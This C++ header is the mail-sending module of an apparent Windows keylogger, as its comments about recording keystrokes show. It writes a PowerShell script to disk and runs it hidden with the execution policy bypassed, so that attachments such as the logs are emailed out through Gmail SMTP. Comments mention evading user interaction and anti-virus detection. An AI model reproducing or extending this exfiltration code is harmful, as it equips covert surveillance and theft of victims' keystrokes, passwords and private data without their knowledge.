#ifndef SENDMAIL_H
#define SENDMAIL_H

#include <fstream>
#include <vector>
#include "windows.h"
#include "IO.h"
#include "Timer.h"
#include "Helper.h"
#include "config.h"

//send mail powershell (ps1)
#define SCRIPT_NAME "sm.ps1"

namespace Mail
{
        //email to send TO
        std::string X_EM_TO = CONFIG_DICT["GMAIL_LOGIN"];
        std::string X_EM_FROM = CONFIG_DICT["GMAIL_LOGIN"];
        std::string X_EM_PASS = CONFIG_DICT["GMAIL_PASSWORD"];

        //MailInstance(){}

        //send email powershellscript written for C++
        const std::string &PowerShellScript =
        "Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
        "[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
        " {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
        "[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
        "[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
        "[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
        "[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
        "[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
        "[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
        "System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
        "\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
        "                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
        "  ForEach ($val in $Attachments)\r\n                    "
        "        {\r\n               "
        "                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
        "         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
        "}\r\n                catch\r\n                    {\r\n                        exit 2; "
        "\r\n                    }\r\n            }\r\n "
        "           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
        "           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
        "System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
        "           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
        "exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
        "  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
        "Send-EMail -attachment $Att "
        "-To \"" +
         std::string (X_EM_TO) +
         "\""
        " -Body $Body -Subject $Subj "
        "-password \"" +
         std::string (X_EM_PASS) +
          "\""
        " -From \"" +
         std::string (X_EM_FROM) +
        "\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";

        std::string StringReplace(std::string s, const std::string &what, const std::string &with)
        {
            //take 3 seperate arguments
            //string itself
            //finding what pattern
            //replace the pattern to the with variable
            if(what.empty())
                return s;
            size_t sp = 0; //iterating through the string one position at a time

            while((sp = s.find(what, sp)) != std::string::npos) //not equals to the string termination npos
            {
                s.replace(sp, what.length(), with), sp += with.length();
            }
            return s;
        }

        bool CheckFileExists( const std::string &f)
        {
            std::ifstream file(f);
            return (bool)file; //if there is a file = true, else = false
        }

        bool CreateScript()
        {
            std::ofstream script(IO::GetOurPath(true) + std::string(SCRIPT_NAME));

            if(!script) //if script does not exist
                return false;
            script << PowerShellScript; //output the powershellscript into the script

            if(!script) //check if the writing to the file is OK (anti virus dont detect)
                false;



            script.close(); //close script
            return true;
        }

        Timer m_timer; //timer for sending mails, made it a global variable so that it does not die at the end of the function (why? We need to use it again if mail fails)

        //if mail sending fails, it will send it again
        int SendMail(const std::string &subject, const std::string &body, const std::string &attachments) //3 arguments, subject body attachments
        {
            Helper::WriteAppLog("Trying to SEND MAIL");
            bool ok;
            //testing within this code to see if this script works
            ok = IO::MkDir(IO::GetOurPath(true));
            if(!ok){
                Helper::WriteAppLog("Make Directory FAILED");
                return -1; //not able to create directory
            }
            //one log file for recording keystrokes
            //one log file for debugging which will give error codes
            //pull from reverse shell impt
            std::string scr_path = IO::GetOurPath(true) + std::string(SCRIPT_NAME);
            if(!CheckFileExists(scr_path)) //if doesnt exist, create it
                ok = CreateScript();

            if(!ok)
            {
                Helper::WriteAppLog("Creating Script FAILED");
                return -2; //error code -2
            }


            //power shell by default needs admin or user interaction to execute a script, need to find a way to bypass this
            //default flag to pass to powershell when you call a script execution policy bypass
            std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" -Subj \""
                                + StringReplace(subject, "\"", "\\\"") +
                                "\" -Body \""
                                + StringReplace(body, "\"", "\\\"") +
                                "\" -Att \"" + attachments + "\"";

            //set shell execute info - Windows API
            SHELLEXECUTEINFO ShExecInfo = {0};
            ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO); //size of structure
            ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;  //(prevent Powershell to terminating immediately to grab some debugging information)
            ShExecInfo.lpParameters = param.c_str();//execution parameters
            ShExecInfo.nShow = SW_HIDE; //hide the execution window
            ShExecInfo.lpVerb = "open"; //long pointer verb (when you right click it shows options, default is Bolded = Open)
            ShExecInfo.lpFile = "powershell"; //file to execute we will use powershell
            ShExecInfo.hwnd = NULL; //doesnt need this handle because KL has no window
            ShExecInfo.lpDirectory = NULL; //dont need a working directory
            ShExecInfo.hInstApp = NULL; //app that handles the instance



            ok = (bool)ShellExecuteEx(&ShExecInfo); //execute the shell script and returns a boolean
            if(!ok)
            {
                Helper::WriteAppLog("Powershell Script CANNOT BE EXECUTED");
                return -3; //means script cannot be executed
            }


            //wait for 7 seconds for mail sending
            WaitForSingleObject(ShExecInfo.hProcess, 7000); //wait for the process for 7000 milliseconds
            DWORD exit_code = 100; //DWORD = Windows API type 100 is arbitrary;
            GetExitCodeProcess(ShExecInfo.hProcess, &exit_code); //get exit code and put into exit_code variable
            Helper::WriteAppLog("<From SendMail> Return code: " + Helper::ToString((int)exit_code));

            //give it yet another chance
            m_timer.SetFunction([&]()//lambda function also known as an anonymous function, use it to access all the variables from this function (sendmail), can do whatever we want with them
            {
                 //logging this event into debugging file
                try{
                    DWORD code_exit = 0;
                    GetExitCodeProcess(ShExecInfo.hProcess, &code_exit);
                    if((int)code_exit == STILL_ACTIVE){//compare the exit code to 259 concessus in Windows API = its still active even if it couldnt do what it is supposed to do
                        Helper::WriteAppLog("Terminating Shell Process."); //logging this event into debugging file
                        TerminateProcess(ShExecInfo.hProcess, 100);//terminate it
                    }

                } catch (...)
                {
                     Helper::WriteAppLog("Error in Mail Timer");
                }
                //Helper::WriteAppLog("<From SendMail> Return code: " + Helper::ToString((int)exit_code)); //logging this event into debugging file
            });

            m_timer.RepeatCount(1L); //execute once
            m_timer.SetInterval(10L); //why wait 60000 then wait 10??
            m_timer.Start(true); //starts asynchronous action

            return (int) exit_code;

        }

        //overload the method with multiple attachments
        int SendMail(const std::string &subject, const std::string &body, const std::vector<std::string> &att)
        {
            std::string attachments = ""; //empty string first
            if(att.size() == 1U) //1U = unsigned integers, if only have 1 attachment
                attachments = att.at(0);
            else //construct a string of attachments
            {
                for(const auto &v : att) //auto datatype iterator
                    attachments += v + "::";
                attachments = attachments.substr(0, attachments.length() - 2); //delete the last 2 words the :: not on top?
            }
            return SendMail(subject, body, attachments);
        }

}

#endif // SENDMAIL_H
